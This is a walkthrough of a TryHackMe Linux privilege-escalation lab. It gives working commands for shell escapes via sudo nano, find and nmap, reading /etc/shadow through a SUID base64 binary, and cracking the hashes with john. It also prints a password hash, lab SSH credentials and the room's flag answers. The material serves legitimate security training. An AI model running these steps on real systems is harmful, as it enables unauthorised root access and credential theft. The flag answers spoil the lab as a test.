---
title: Linux PrivEsc
date: 2022-06-17 18:32:00 -0500
categories: [Lesson, Tutorial]
tags: [PrivEsc, Linux, Enumeration, Netstat, Find]
---

Learn the fundamentals of Linux privilege escalation. From enumeration to exploitation, get hands-on with over 8 different privilege escalation techniques. Netstat and Find.

[https://tryhackme.com/room/linprivesc](https://tryhackme.com/room/linprivesc)

* * *

## Task 1 - Introduction

This room was designed to cover the main privilege escalation vectors and give you a better understanding of the process. This new skill will be an essential part of your arsenal whether you are participating in CTFs, taking certification exams, or working as a penetration tester.

* * * 

## Task 2 - What is Privilege Escalation? 

It's rare when performing a real-world penetration test to be able to gain a foothold (initial access) that gives you direct administrative access. Privilege escalation is crucial because it lets you gain system administrator levels of access, which allows you to perform actions such as:

   - Resetting passwords
   - Bypassing access controls to compromise protected data
   - Editing software configurations
   - Enabling persistence
   - Changing the privilege of existing (or new) users
   - Execute any administrative command

## Task 3 - Enumeration 

Enumeration is the first step you have to take once you gain access to any system. 

Useful Enumeration Commands:

| Command | Result |
|---------|--------|
| ``hostname`` | Returns the hostname of the machine |
| ``uname -a`` | Prints system information and detail about the kernal |
| ``cat /proc/version`` | Provides information about the target system processes |
| ``cat /etc/issue`` | This file usually contains some information about the operating system but can easily be customized or changed. While on the subject, any file containing system information can be customized or changed. |
| ``ps`` | see running processes. ``ps -A`` views all running processes. ``ps axjf`` view process tree |
| ``env`` | shows enviromental variables |
| ``sudo -l`` | lists all commands user can run as sudo (useful for gaining root shell) |
| ``ls -las`` | using flags like this can see hidden files/directories |
| ``id`` | provide a general overview of the user’s privilege level and group memberships. |
| ``cat /etc/passwd`` | discover users on the system can also be piped to be cut for useful list for brute-force attacks ``cut -d ":" -f 1`` |
| ``history`` | looks at earliar commands in the history |
| ``ifconfig`` | show information about network configuration |
| ``ip route`` | see which network routes exist |

##   Netstat Command

| Flag | Result |
|------|--------|
| ``-a`` | shows all ports and connections, ``-at`` or ``-au`` to list TCP or UDP protocols |
| ``-l`` | list port in listening mode; these ports are open and ready to accept incoming connections. |
| ``-s`` | list network statistics by protocol (can also be used with -t or -u)
| ``-tp`` | list connection with service name a4play timers |

##   Find Command

| Command | Result |
|---------|--------|
| ``find . -name flag1.txt`` | find the file named “flag1.txt” in the current directory |
| ``find /home -name flag1.txt`` | find the file names “flag1.txt” in the /home directory |
| ``find / -type d -name config`` | find the directory named config under “/” |
| ``find / -type f -perm 0777`` | find files with the 777 permissions (files readable, writable, and executable by all users) |
| ``find / -perm a=x`` | find executable files |
| ``find /home -user frank`` | find all files for user “frank” under “/home” |
| ``find / -mtime 10`` | find files that were modified in the last 10 days |
| ``find / -atime 10`` | find files that were accessed in the last 10 day |
| ``find / -cmin -60`` | find files changed within the last hour (60 minutes) |
| ``find / -amin -60`` | find files accesses within the last hour (60 minutes) |
| ``find / -size 50M`` | find files with a 50 MB size |
| ``find / -writable -type d 2>/dev/null`` | Find world-writeable folders |
| ``find / -perm -222 -type d 2>/dev/null`` | Find world-writeable folders |
| ``find / -perm -o w -type d 2>/dev/null`` | Find world-writeable folders |
| ``find / -perm -o x -type d 2>/dev/null `` | Find world-executable folders |
| ``find / -name perl*`` | Find perl
| ``find / -name python*`` | Find python
| ``find / -name gcc*`` | Find gcc
| ``find / -perm -u=s -type f 2>/dev/null`` | Find files with the SUID bit, which allows us to run the file with a higher privilege level than the current user. |

Time to get familiar with ``find``, ``locate``, ``grep``, ``cut``, ``sort``.

##   Answer the questions below

**What is the hostname of the target system?**

- ``hostname`` wade7363

**What is the Linux kernel version of the target system?**

- ``uname -a`` 3.13.0-24-generic

**What Linux is this?**

- ``cat /etc/issue`` Ubuntu 14.04 LTS

**What version of the Python language is installed on the system?**

- ``python -V`` 2.7.6

**What vulnerability seem to affect the kernel of the target system? (Enter a CVE number)**

- exploit-db 3.13.0 ubuntu gives us CVE-2015-1328

* * * 

## Task 4 - Automated Enumeration Tools

- [LinPeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
- [LinEnum](https://github.com/rebootuser/LinEnum)
- [Linux Exploit Suggester](https://github.com/mzet-/linux-exploit-suggester)
- [Linux Smart Enumeration](https://github.com/diego-treitos/linux-smart-enumeration)
- [Linux Priv Checker](https://github.com/linted/linuxprivchecker)

* * * 

## Task 5 - Privilege Escalation: Kernel Exploits 

##   Answer the questions below

**Find and use the appropriate kernel exploit to gain root privileges on the target system.**

- ``uname -a`` Ubuntu 3.13.0-24-generic
- ``searchsploit 3.13.0`` setup ``python3 -m http.server 8009`` and wget it to target machine
- befor transfering over compile with ``gcc`` then ``chmod +x`` and execute to gain root shell.

**What is the content of the flag1.txt file?**

![0xskar](/assets/linprivesc01.png)

* * * 

## Task 6 - Privilege Escalation: Sudo

- ``sudo -l`` we can see what commands we can run as sudoer
- [GTFO Bins](https://gtfobins.github.io/) provides info on how we can use these programs for leverage.

##   Answer the questions below

**How many programs can the user "karen" run on the target system with sudo rights?**

- 3

**What is the content of the flag2.txt file?**

- THM-402028394

**How would you use Nmap to spawn a root shell if your user had sudo rights on nmap?**

- ``sudo nmap --interactive``

**What is the hash of frank's password?**

We get access to root via nano:
```
sudo nano
^R^X
reset; sh 1>&0 2>&0
```
cat /etc/shadow
- $6$2.sUUDsOLIpXKxcr$eImtgFExyr2ls4jsghdD3DHLHHP9X50Iv.jNmwo/BJpphrPRJWjelWEz2HH.joV14aDEwW1c3CahzB1uaqeLR1

* * * 

## Task 7 - Privilege Escalation: SUID 

- ``find / -type f -perm -04000 -ls 2>/dev/null`` will list files that have SUID or SGID bits set.

A good practice would be to compare executables on this list with [GTFOBins](https://gtfobins.github.io/#+suid). Clicking on the SUID button will filter binaries known to be exploitable when the SUID bit is set (you can also use this link for a pre-filtered list.

##   Answer the questions below

**Which user shares the name of a great comic book writer?**

- ``cat /etc/passwd``
- gerryconway

**What is the password of user2?**

We have to get access to /etc/shadow and /etc/passwd in order to feed it to john's ``unshadow`` tool.

1. ``sudo -l``
2. /usr/bin/base64 has the SUID bit set. 
3. ``base64 /etc/shadow``
4. decrypt and save this to shadow.txt and save /etc/passwd to passwd.txt 
5. ``unshadow passwd.txt shadow.txt > passwords.txt``
6. ``john --wordlist=/usr/share/wordlists/rockyou.txt passwords.txt``

- Password1

**What is the content of the flag3.txt file?**

- we know the flag is at /home/ubuntu/flag3.txt
- ``base64 /home/ubuntu/flag3.txt`` and decode for the flag
- THM-3847834

* * *

## Task 8 - Privilege Escalation: Capabilities 

- ``getcap -r / 2>/dev/null`` to list enabled capabilities

##   Answer the questions below

**How many binaries have set capabilities?**

- 6

**What other binary can be used through its capabilities?**

- view

**What is the content of the flag4.txt file?**

- THM-9349843

* * * 

## Task 9 - Privilege Escalation: Cron Jobs

- Any user can read the file keeping system-wide cron jobs under ``/etc/crontab``

##   Answer the questions below

**How many user-defined cron jobs can you see on the target system?**

- 4

**What is the content of the flag5.txt file?**

- THM-383000283

**What is Matt's password?**

- We can ``unshadow`` and feed to john to get 123456

* * * 

## Task 10 - Privilege Escalation: PATH 

Be sure you can answer the questions below before trying this.

  - What folders are located under $PATH
  - Does your current user have write privileges for any of these folders?
  - Can you modify $PATH?
  - Is there a script/application you can start that will be affected by this vulnerability?

``find / -writable 2>/dev/null`` - find writable folders
``find / -writable 2>/dev/null | cut -d "/" -f 2 | sort -u`` - cleaned up

##   Answer the questions below

**What is the odd folder you have write access for?**

- /home/murdoch

**What is the content of the flag6.txt file?**

- THM-736628929

* * *

## Task 11 - Privilege Escalation: NFS 

- ``cat /etc/exports`` - NFS (Network File Sharing) configuration is kept in the /etc/exports file. The critical element for this privilege escalation vector is the “``no_root_squash``” option. By default, NFS will change the root user to nfsnobody and strip any file from operating with root privileges. If the “no_root_squash” option is present on a writable share, we can create an executable with SUID bit set and run it on the target system.

##   Answer the questions below

**How many mountable shares can you identify on the target system?**

- 3

**How many shares have the "no_root_squash" option enabled?**

- 3

**Gain a root shell on the target system**

- mount sharedfolder ``mount -o rw target:/home/ubuntu/sharedfolder /tmp/superbackups`` and chmod +s nfs file from example.

**What is the content of the flag7.txt file?**

- THM-89384012

* * * 

## Task 12 - Capstone Challenge 

You have gained SSH access to a large scientific facility. Try to elevate your privileges until you are Root.
We designed this room to help you build a thorough methodology for Linux privilege escalation that will be very useful in exams such as OSCP and your penetration testing engagements.

Leave no privilege escalation vector unexplored, privilege escalation is often more an art than a science.

You can access the target machine over your browser or use the SSH credentials below.

   - Username: leonard
   - Password: Penny123

##   Answer the questions below

Notes:
- Linux Version 3.10.0-1160.el7.x86_64
- SUID /usr/bin/base64 
- Vulnerable to CVE-2021-4034
- PATH Abuses ``/home/leonard/`` ``/home/leonard/perl5``
- CVE Suggestions: [CVE-2016-5195] dirtycow [CVE-2016-5195] dirtycow 2 
- users: leonard, missy, root

**What is the content of the flag1.txt file?**

- `scp leonard@10.10.113.87:/etc/passwd passwd_challenge.txt`
- `base64` has SUID so we can read /etc/shadow and decrype and save to shadow_challenge.txt
- ``unshadow passwd_challenge.txt shadow_challenge.txt > challenge.txt`` 
- ``john challenge.txt --wordlist=/usr/share/wordlists/rockyou.txt``

- missy password = Password1

- flag.txt is in documents

**What is the content of the flag2.txt file?**

- missy can fun find as sudo
- ``sudo find . -exec /bin/sh \; -quit`` gives us a root shell!
- cat rootflag/flag2.txt







